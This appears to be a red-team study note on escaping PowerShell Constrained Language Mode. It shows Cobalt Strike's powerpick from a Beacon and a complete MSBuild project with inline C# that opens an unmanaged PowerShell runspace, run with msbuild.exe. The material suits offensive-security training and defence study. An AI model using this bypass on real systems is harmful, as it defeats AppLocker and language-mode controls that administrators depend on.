
If you try to run a script or command in PowerShell and see an error like "only core types in this language mode", then you know you're operating in a restricted environment.  

If you can find an AppLocker bypass to execute arbitrary code, you can also break out of PowerShell Constrained Language Mode by using an unmanaged PowerShell runspace.

Here are some methods to try to escape [[Powershell CLM]]


#### 🖊️ via Cobalt Strike

1) If you have a Beacon running on a target, this is just what powerpick does.

```
beacon> powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

beacon> powerpick $ExecutionContext.SessionState.LanguageMode
FullLanguage
```


#### 📔 via a LOLBin

1) You can try using `MSBuild` to escape powershell CLM

```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
     <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Linq;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;

            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    using (var runspace = RunspaceFactory.CreateRunspace())
                    {
                      runspace.Open();

                      using (var posh = PowerShell.Create())
                      {
                        posh.Runspace = runspace;
                        posh.AddScript("$ExecutionContext.SessionState.LanguageMode");
                                                
                        var results = posh.Invoke();
                        var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());
                        
                        Console.WriteLine(output);
                      }
                    }

                return true;
              }
            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

2) Then:

`C:\> msbuild.exe bypass.csproj`



#### ⚠ Opsec




### Properties
---
📆 created   {{29-02-2024}} 15:47
🏷️ tags: #redteam #crto 

---



